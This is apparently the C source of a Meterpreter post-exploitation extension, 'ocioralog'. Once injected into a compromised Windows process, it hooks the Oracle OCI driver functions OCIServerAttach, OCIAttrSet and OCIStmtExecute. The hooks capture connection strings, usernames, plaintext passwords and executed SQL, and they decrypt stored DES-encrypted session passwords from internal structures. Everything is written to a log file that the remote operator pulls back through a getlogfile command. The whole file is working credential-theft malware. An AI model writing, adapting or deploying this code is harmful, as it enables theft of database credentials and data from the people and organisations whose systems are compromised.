/*
 * This module implements OCI driver function hooking features 
 */
#define _CRT_SECURE_NO_DEPRECATE 1
#include "../../common/common.h"
#include "ocioralog.h"

#include "../../ReflectiveDLLInjection/DelayLoadMetSrv.h"
// include the Reflectiveloader() function, we end up linking back to the metsrv.dll's Init function
// but this doesnt matter as we wont ever call DLL_METASPLOIT_ATTACH as that is only used by the 
// second stage reflective dll inject payload and not the metsrv itself when it loads extensions.
#include "../../ReflectiveDLLInjection/ReflectiveLoader.c"

#include "mhook-lib\mhook.h"
#include <openssl/des.h>
#include <openssl/evp.h>
#include <string.h>

// this sets the delay load hook function, see DelayLoadMetSrv.h
EnableDelayLoadMetSrv();


char logfn[1000] = {'\0'};

OCIATTRSET      o_ociattrset;
OCISTMTEXECUTE  o_ocistmtexecute;
OCISERVERATTACH o_ociserverattach;

BOOL isOCIAttrSetHooked		 = 0;
BOOL isOCIServerAttachHooked = 0;
BOOL isOCIStmtExecuteHooked  = 0;

sword m_OCISERVERATTACH(OCIServer *srvhp, OCIError *errhp, CONST text dblink, sb4 dblink_len, ub4 mode)
{
	char message[1000] = {'\0'};
	char *temp;

	write_log(logfn,"SERVERATTACH\n");

	temp = (char*)malloc(dblink_len+1);
	strncpy(temp,dblink,dblink_len);
	temp[dblink_len] = '\0';

	sprintf(message,"[OCIServerAttach] Connection string: %s\n",temp);
	write_log(logfn,message);

	return o_ociserverattach(srvhp,errhp,dblink,dblink_len,mode);
}

sword m_OCIATTRSET(dvoid *trgthndlp,ub4 trghndltyp,dvoid *attributep,ub4 size,ub4 attrtype,OCIError *errhp)
{
	char message[1000] = {'\0'};
	//memset(message,0,1000);

	if (attrtype == OCI_ATTR_USERNAME) {
      sprintf(message,"[OCIAttrSet] Username: %s\n",(char*)attributep);
	} else if (attrtype == OCI_ATTR_PASSWORD){
	  sprintf(message,"[OCIAttrSet] Password: %s\n",(char*)attributep);
	} else if (attrtype == OCI_ATTR_SERVER) {
	  	
	}

	write_log(logfn,message);
	
	return o_ociattrset(trgthndlp,trghndltyp,attributep,size,attrtype,errhp);
}	

sword m_OCISTMTEXECUTE(OCISvcCtx *svchp, OCIStmt *stmtp, OCIError *errhp, ub4 iters, ub4 rowoff, 
		                          CONST OCISnapshot *snap_in, OCISnapshot *snap_out, ub4 mode)
{
	logUsernamePassword(svchp);
	logSQLStmt(stmtp);

	//Call the original method
	return o_ocistmtexecute(svchp,stmtp,errhp,iters,rowoff,snap_in,snap_out,mode);
}

int logUsernamePassword(OCISvcCtx *svchp) {
	char message[1000];
	myOCISvcCtx *svcctx;
	myOCISession *sess;
	char l_username = 0;
	char *username;
	char *password;
	DESEncrptedPassword encPassword;
	char l_password = 0;
	unsigned char temp[64];
	unsigned char *t;
	int outlen;

	//Get the pointers to point to the OCISvcContext and OCISession structures
	svcctx = (myOCISvcCtx*)svchp;
	sess   = (myOCISession*)(svcctx->p_sess);

	//Get the username
	l_username = sess->l_username;
	username = (char*)malloc(l_username+1);
	strncpy(username,sess->p_username,l_username); //save it
	username[l_username]='\0'; //terminate it

	sprintf(message,"[OCIStmtExecute] Username: %s\n",username);
	write_log(logfn,message); //log it

	//Get the password
	encPassword = sess->encryptedPassword;
	t = encPassword.cipherText;
	l_password = 0;
	while (*t != 0 || *(t+1) != 0) { //We are looking for double 0x00 bytes 
		temp[l_password]=*t; 
		l_password++;
		t++;
	} // 'temp' contains the encrypted password

	// In some cases the last 00 byte is required (DES can output 00 byte as the part of the ciphertext!!)
	// Mark: maybe it is not necessary, have to check!
	if (l_password % 8 != 0) {
		temp[l_password]='\0';
		l_password++;
	}
	
	password = (char*)malloc(l_password+1);

	//Decrypt the password
	outlen = DESdecrypt((char*)encPassword.key,(char*)temp,l_password,password);
	password[outlen] = '\0';

	sprintf(message,"[OCIStmtExecute] Password: %s\n",password);
	write_log(logfn,message); //log it

	return 0;
}

int logSQLStmt(OCIStmt *stmtp) {
	char message[1000];
	myOCIStmt *stmt;
	char sql[1024];
	char *t;
	int l_sql;

	memset(message,0,1000);
	stmt = (myOCIStmt*)stmtp;

	t = stmt->p_stmt;
	l_sql = 0;
	while (*t != 0 && l_sql<1023) {
		sql[l_sql] = *t;
		l_sql++;
		t++;
	}
	sql[l_sql] = '\0';

	sprintf(message,"[OCIStmtExecute] SQL: %s\n",sql);
	write_log(logfn,message);

	return 0;
}

int DESdecrypt( char *Key, char *Msg, int size, char *res)
{
	
	unsigned char iv[]={0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0};
	EVP_CIPHER_CTX ctx;
	int outlen;
	int len = 0;
	
	EVP_CIPHER_CTX_init(&ctx);
	EVP_DecryptInit_ex(&ctx, EVP_des_cbc(), NULL, (const unsigned char*)Key, iv);
	EVP_DecryptUpdate(&ctx, (unsigned char*)res, &outlen, (const unsigned char*)Msg, size);
	len += outlen;
	EVP_DecryptFinal_ex(&ctx, (unsigned char*)res, &outlen);
    len += outlen;
	EVP_CIPHER_CTX_cleanup(&ctx);

	return len;
	
}

int hookOCIServerAttach()
{
	if (!isOCIServerAttachHooked)
	{
		HMODULE hMod;
		char dll_to_hook[200] = {'\0'};

		strncpy(dll_to_hook, "oci.dll", 200);
		hMod = GetModuleHandleA(dll_to_hook);

		if (hMod == NULL)
		{
			write_log(logfn,"[hookOCIServerAttach] ERROR: Function cannot be hooked\n");
			return ERROR_NOT_FOUND;
		}

		//Get the address of the original function and
		//redirect the call into our function 
		o_ociserverattach = (OCISERVERATTACH) GetProcAddress(hMod, "OCIServerAttach");
		Mhook_SetHook((PVOID*)&o_ociserverattach, m_OCISERVERATTACH);

		isOCIServerAttachHooked = 1;
		return ERROR_SUCCESS;
	}
	return ERROR_ALREADY_INITIALIZED;
}

DWORD request_ocioralog_hookOCIServerAttach(Remote *remote, Packet *packet)
{
	
	Packet *response = packet_create_response(packet);
	
	DWORD result = hookOCIServerAttach();

	switch (result)
	{
	case ERROR_SUCCESS: 
		packet_add_tlv_string(response, TLV_TYPE_OCIORALOG_HOOKOCISERVERATTACH, "OCIServerAttach function hooking completed\n");
		packet_transmit_response(ERROR_SUCCESS, remote, response);
		return ERROR_SUCCESS;
	case ERROR_NOT_FOUND:
		packet_add_tlv_string(response, TLV_TYPE_OCIORALOG_HOOKOCISERVERATTACH, "OCIServerAttach function cannot be hooked\n");
		packet_transmit_response(ERROR_NOT_FOUND, remote, response);
		return ERROR_NOT_FOUND;
	case ERROR_ALREADY_INITIALIZED:
		packet_add_tlv_string(response, TLV_TYPE_OCIORALOG_HOOKOCISERVERATTACH, "OCIServerAttach function has already been hooked\n");
		packet_transmit_response(ERROR_ALREADY_INITIALIZED, remote, response);
		return ERROR_ALREADY_INITIALIZED;
	}
		
}

int hookOCIStmtExecute()
{
	if (!isOCIStmtExecuteHooked) 
	{
		HMODULE hMod;
		char dll_to_hook[200] = {'\0'};

		strncpy(dll_to_hook, "oci.dll", 200);
		hMod = GetModuleHandleA(dll_to_hook);

		if (hMod == NULL)
		{
			write_log(logfn,"[hookOCIStmtExecute] ERROR: Function cannot be hooked\n");
			return ERROR_NOT_FOUND;
		}

		//Get the address of the original function and
		//redirect the call into our function 
		o_ocistmtexecute = (OCISTMTEXECUTE)	GetProcAddress(hMod, "OCIStmtExecute");
		Mhook_SetHook((PVOID*)&o_ocistmtexecute, m_OCISTMTEXECUTE);
		isOCIStmtExecuteHooked = 1;
		return ERROR_SUCCESS;
	}
	return ERROR_ALREADY_INITIALIZED;
}

DWORD request_ocioralog_hookOCIStmtExecute(Remote *remote, Packet *packet)
{
	
	Packet *response = packet_create_response(packet);

	DWORD result = hookOCIStmtExecute();

	switch (result)
	{
	case ERROR_SUCCESS: 
		packet_add_tlv_string(response, TLV_TYPE_OCIORALOG_HOOKOCISTMTEXECUTE, "OCIStmtExecute function hooking completed\n");
		packet_transmit_response(ERROR_SUCCESS, remote, response);
		return ERROR_SUCCESS;
	case ERROR_NOT_FOUND:
		packet_add_tlv_string(response, TLV_TYPE_OCIORALOG_HOOKOCISTMTEXECUTE, "OCIStmtExecute function cannot be hooked\n");
		packet_transmit_response(ERROR_NOT_FOUND, remote, response);
		return ERROR_NOT_FOUND;
	case ERROR_ALREADY_INITIALIZED:
		packet_add_tlv_string(response, TLV_TYPE_OCIORALOG_HOOKOCISTMTEXECUTE, "OCIStmtExecute function has already been hooked\n");
		packet_transmit_response(ERROR_ALREADY_INITIALIZED, remote, response);
		return ERROR_ALREADY_INITIALIZED;
	}

	
}

int hookOCIAttrSet()
{
	if (!isOCIAttrSetHooked)
	{
		HMODULE hMod;
		char dll_to_hook[200] = {'\0'};

		strncpy(dll_to_hook, "oci.dll", 200);
		hMod = GetModuleHandleA(dll_to_hook);

		if (hMod == NULL)
		{
			write_log(logfn,"[hookOCIAttrSet] ERROR: Function cannot be hooked\n");
			return ERROR_NOT_FOUND;
		}

		//Get the address of the original function and
		//redirect the call into our function 
		o_ociattrset = (OCIATTRSET)	GetProcAddress(hMod, "OCIAttrSet");
		Mhook_SetHook((PVOID*)&o_ociattrset, m_OCIATTRSET);
		isOCIAttrSetHooked = 1;
		return ERROR_SUCCESS;
	}
	return ERROR_ALREADY_INITIALIZED;
}


DWORD request_ocioralog_hookOCIAttrSet(Remote *remote, Packet *packet)
{
	
	Packet *response = packet_create_response(packet);

	DWORD result = hookOCIAttrSet();

	switch (result)
	{
	case ERROR_SUCCESS: 
		packet_add_tlv_string(response, TLV_TYPE_OCIORALOG_HOOKOCIATTRSET, "OCIAttrSet function hooking completed\n");
		packet_transmit_response(ERROR_SUCCESS, remote, response);
		return ERROR_SUCCESS;
	case ERROR_NOT_FOUND:
		packet_add_tlv_string(response, TLV_TYPE_OCIORALOG_HOOKOCIATTRSET, "OCIAttrSet function cannot be hooked\n");
		packet_transmit_response(ERROR_NOT_FOUND, remote, response);
		return ERROR_NOT_FOUND;
	case ERROR_ALREADY_INITIALIZED:
		packet_add_tlv_string(response, TLV_TYPE_OCIORALOG_HOOKOCIATTRSET, "OCIAttrSet function has already been hooked\n");
		packet_transmit_response(ERROR_ALREADY_INITIALIZED, remote, response);
		return ERROR_ALREADY_INITIALIZED;
	}
}	
	

DWORD request_ocioralog_hook(Remote *remote, Packet *packet)
{
	
	Packet *response = packet_create_response(packet);

	DWORD result1,result2,result3;
	
	result1 = hookOCIAttrSet();
	result2 = hookOCIServerAttach();
	result3 = hookOCIStmtExecute();

	if (result1 == ERROR_SUCCESS && result2 == ERROR_SUCCESS && result3 == ERROR_SUCCESS)
	{
		packet_add_tlv_string(response, TLV_TYPE_OCIORALOG_HOOK, "Function hooking completed\n");
		packet_transmit_response(ERROR_SUCCESS, remote, response);
		return ERROR_SUCCESS;
	}
	else 
	{
		packet_add_tlv_string(response, TLV_TYPE_OCIORALOG_HOOK, "Function hooking failed. See the logfile (getlogfile) for more details\n");
		packet_transmit_response(ERROR_SUCCESS, remote, response);
		return ERROR_ERRORS_ENCOUNTERED;
	}
}

int unhookOCIServerAttach()
{
	HMODULE hMod;
	char dll_to_hook[200] = {'\0'};

	if (isOCIServerAttachHooked)
	{
		strncpy(dll_to_hook, "oci.dll", 200);
		hMod = GetModuleHandleA(dll_to_hook);
		if (hMod == NULL) return 1;
		Mhook_Unhook((PVOID*)&o_ociattrset);
		isOCIServerAttachHooked = 0;
	}

}

DWORD request_ocioralog_unhookOCIServerAttach(Remote *remote, Packet *packet)
{
	Packet *response = packet_create_response(packet);
	
	unhookOCIServerAttach();

	packet_add_tlv_string(response, TLV_TYPE_OCIORALOG_UNHOOKOCISERVERATTACH, "OCIServerAttach function unhooking completed\n");
	packet_transmit_response(ERROR_SUCCESS, remote, response);

	return ERROR_SUCCESS;
}

int unhookOCIStmtExecute()
{
	if (isOCIStmtExecuteHooked)
	{
		HMODULE hMod;
		char dll_to_hook[200] = {'\0'};

		strncpy(dll_to_hook, "oci.dll", 200);
		hMod = GetModuleHandleA(dll_to_hook);
		if (hMod == NULL) return 1;
		Mhook_Unhook((PVOID*)&o_ocistmtexecute);
		isOCIStmtExecuteHooked = 0;
	}
}

DWORD request_ocioralog_unhookOCIStmtExecute(Remote *remote, Packet *packet)
{
	Packet *response = packet_create_response(packet);
	
	unhookOCIStmtExecute();

	packet_add_tlv_string(response, TLV_TYPE_OCIORALOG_UNHOOKOCISTMTEXECUTE, "OCIStmtExecute function unhooking completed\n");
	packet_transmit_response(ERROR_SUCCESS, remote, response);

	return ERROR_SUCCESS;
}

int unhookOCIAttrSet()
{
	if (isOCIAttrSetHooked)
	{
		HMODULE hMod;
		char dll_to_hook[200] = {'\0'};

		strncpy(dll_to_hook, "oci.dll", 200);
		hMod = GetModuleHandleA(dll_to_hook);
		if (hMod == NULL) return 1;
		Mhook_Unhook((PVOID*)&o_ociattrset);
		isOCIAttrSetHooked = 0;
	}
}

DWORD request_ocioralog_unhookOCIAttrSet(Remote *remote, Packet *packet)
{
	Packet *response = packet_create_response(packet);
	
	unhookOCIAttrSet();

	packet_add_tlv_string(response, TLV_TYPE_OCIORALOG_UNHOOKOCIATTRSET, "OCIAttrSet function unhooking completed\n");
	packet_transmit_response(ERROR_SUCCESS, remote, response);

	return ERROR_SUCCESS;
}


DWORD request_ocioralog_unhook(Remote *remote, Packet *packet)
{
	
	Packet *response = packet_create_response(packet);
	
	unhookOCIAttrSet();
	unhookOCIStmtExecute();
	unhookOCIServerAttach();

	packet_add_tlv_string(response, TLV_TYPE_OCIORALOG_UNHOOK, "Function unhooking completed\n");
	packet_transmit_response(ERROR_SUCCESS, remote, response);

	return ERROR_SUCCESS;
}



long getfilesize(char *filename)
{
   long filesize;
   FILE *FileToCheck = NULL;
   FileToCheck = fopen(filename, "rb");
   if (!FileToCheck)
	   return -1;
   fseek(FileToCheck, 0, SEEK_END);  
   filesize = ftell(FileToCheck);  
   fclose(FileToCheck);  
   return filesize;
}

DWORD request_ocioralog_getlogfile(Remote *remote, Packet *packet)
{
	
	Packet *response = packet_create_response(packet);
	FILE * fp;
	long size = 0;
	long readbytes = 0;
	char *buffer;
	char line[1024];
	int n;

	size = getfilesize(logfn);
	if (size<0)
		return ERROR_FILE_NOT_FOUND;

	buffer = (char*)malloc(size+1);
	memset(buffer,0,size+1);
	
	fp = fopen (logfn, "rt");  /* open the file for reading */
   /* elapsed.dta is the name of the file */
   /* "rt" means open the file for reading text */

   while(fgets(line, 1024, fp) != NULL)
   {
	   n = strlen(line);
	   readbytes += n;
	   strncat(buffer,line,n);
   }
   buffer[size] = '\0';
   fclose(fp); 
   
   packet_add_tlv_string(response, TLV_TYPE_OCIORALOG_GETLOGFILE, buffer);
   packet_transmit_response(ERROR_SUCCESS, remote, response);

	return ERROR_SUCCESS;
}

DWORD request_ocioralog_setlogfile(Remote *remote, Packet *packet)
{
	
	Packet *response = packet_create_response(packet);
	char *fn = NULL;
	char message[1000] = {'\0'};
	DWORD retval = ERROR_SUCCESS;

	Tlv tlv;
	//Get file contents
	if((retval = packet_get_tlv(packet, TLV_TYPE_OCIORALOG_SETLOGFILE, &tlv)) == ERROR_SUCCESS)
	{
		//Get file name
		fn = packet_get_tlv_value_string(packet, TLV_TYPE_OCIORALOG_SETLOGFILE);
		strncpy(logfn,fn,1000);
		sprintf(message, "New log file: %s\n",logfn);
		write_log(logfn,message);
	} 
  
    packet_add_tlv_string(response, TLV_TYPE_OCIORALOG_SETLOGFILE, message);
    packet_transmit_response(ERROR_SUCCESS, remote, response);

	return ERROR_SUCCESS;
}


Command customCommands[] =
{
	
	{ "ocioralog_hook",
	  { request_ocioralog_hook,                     { 0 }, 0 },
	  { EMPTY_DISPATCH_HANDLER                                      },
	},

    { "ocioralog_unhook",
	  { request_ocioralog_unhook,                     { 0 }, 0 },
	  { EMPTY_DISPATCH_HANDLER                                      },
	},
	
	{ "ocioralog_setlogfile",
	  { request_ocioralog_setlogfile,                     { 0 }, 0 },
	  { EMPTY_DISPATCH_HANDLER                                      },
	},

	{ "ocioralog_getlogfile",
	  { request_ocioralog_getlogfile,                     { 0 }, 0 },
	  { EMPTY_DISPATCH_HANDLER                                      },
	},

	{ "ocioralog_hookOCIAttrSet",
	  { request_ocioralog_hookOCIAttrSet,                     { 0 }, 0 },
	  { EMPTY_DISPATCH_HANDLER                                      },
	},

	{ "ocioralog_hookOCIServerAttach",
	  { request_ocioralog_hookOCIServerAttach,                     { 0 }, 0 },
	  { EMPTY_DISPATCH_HANDLER                                      },
	},

	{ "ocioralog_hookOCIStmtExecute",
	  { request_ocioralog_hookOCIStmtExecute,                     { 0 }, 0 },
	  { EMPTY_DISPATCH_HANDLER                                      },
	},

	{ "ocioralog_unhookOCIAttrSet",
	  { request_ocioralog_unhookOCIAttrSet,                     { 0 }, 0 },
	  { EMPTY_DISPATCH_HANDLER                                      },
	},

	{ "ocioralog_unhookOCIServerAttach",
	  { request_ocioralog_unhookOCIServerAttach,                     { 0 }, 0 },
	  { EMPTY_DISPATCH_HANDLER                                      },
	},

	{ "ocioralog_unhookOCIStmtExecute",
	  { request_ocioralog_unhookOCIStmtExecute,                     { 0 }, 0 },
	  { EMPTY_DISPATCH_HANDLER                                      },
	},

	// Terminator
	{ NULL,
	  { EMPTY_DISPATCH_HANDLER                      },
	  { EMPTY_DISPATCH_HANDLER                      },
	},
};

/*
 * Initialize the server extension
 */
DWORD __declspec(dllexport) InitServerExtension(Remote *remote)
{
	DWORD index;

	char val[1000];
	strncpy(val,getenv("TEMP"),950);
    strncat(val,"\\ocioralog.txt",14);   
	strncpy(logfn,val,1000);
	write_log(logfn,"[InitServerExtension] Extension was loaded\n");

	hMetSrv = remote->hMetSrv;

	for (index = 0;
	     customCommands[index].method;
	     index++)
		command_register(&customCommands[index]);

	return ERROR_SUCCESS;
}

/*
 * Deinitialize the server extension
 */
DWORD __declspec(dllexport) DeinitServerExtension(Remote *remote)
{
	DWORD index;

	for (index = 0;
	     customCommands[index].method;
	     index++)
		command_deregister(&customCommands[index]);

	write_log(logfn,"[DeInitServerExtension] Extension was unloaded\n");
	return ERROR_SUCCESS;
}




int write_log(const char* logfn,char *message){
	FILE* errfh;

	errfh=fopen(logfn,"a");
	if(errfh==NULL){
		fprintf(stderr,"Could not open the log file!\n");
		return -1;
	}
	fprintf(errfh,"%s", message);
	fclose(errfh);
	return 0;
}